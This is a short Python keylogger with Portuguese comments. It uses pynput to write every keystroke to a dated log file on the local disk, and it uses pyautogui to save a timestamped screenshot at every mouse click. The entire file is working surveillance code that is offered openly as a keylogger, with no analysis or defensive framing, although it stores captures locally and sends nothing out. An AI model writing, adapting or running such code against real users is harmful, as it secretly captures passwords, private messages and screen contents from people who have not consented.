# Arquivo que grampeia um computador (Keylogger)
# Guttemberg
# 18/01/2024

#Chamando as bibliotecas
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, pyautogui as py

#iniciando as variáveis
dataAtual = datetime.now()
data = dataAtual.strftime("%d-%m")#Dia e o mês
diretorio_raiz = "D:/gabrielzin/gabriel/cods/vids/keylogger/captado_"+data+"/"#Armazenando o caminho dos arquivos
dados_teclado = diretorio_raiz+"digitado.log"

try:
	os.mkdir(diretorio_raiz)#Criando o novo diretório
except:
	pass

#Evento que identifica teclas apertadas
def on_press(tecla):
	tecla = str(tecla)

	#Fazendo correção de caracteres
	tecla = re.sub(r'\'', '', tecla)
	tecla = re.sub(r'Key.space', ' ', tecla)
	tecla = re.sub(r'Key.enter', '\n', tecla)
	tecla = re.sub(r'Key.tab', '\t', tecla)
	tecla = re.sub(r'Key.backspace', 'apagar', tecla)
	tecla = re.sub(r'Key.*', '', tecla)

	with open(dados_teclado, 'a') as log:
		if str(tecla) == str("apagar"):#Apagando caractere do arquivo
			if os.stat(dados_teclado).st_size != 0:
				tecla = re.sub(r'Key.backspace', '', tecla)
				log.seek(0,2)
				caractere = log.tell()
				log.truncate(caractere - 1)
		else:
			log.write(tecla)

#Evento que identifica click do mouse
def on_click(x, y, buttom, pressed):
	if pressed:
		print = py.screenshot()#Printando a tela do PC
		hora = datetime.now()
		hora_da_print = hora.strftime("%H-%M-%S")#"Formatando" a hora, minuto e segundo
		print.save(os.path.join(diretorio_raiz, "print_"+hora_da_print+".jpg"))#Salvando a print no diretório criado anteriormente

keyboardListener = KeyboardListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

#"Startando" o teclado e o mouse
keyboardListener.start()
mouseListener.start()
keyboardListener.join()
mouseListener.join()
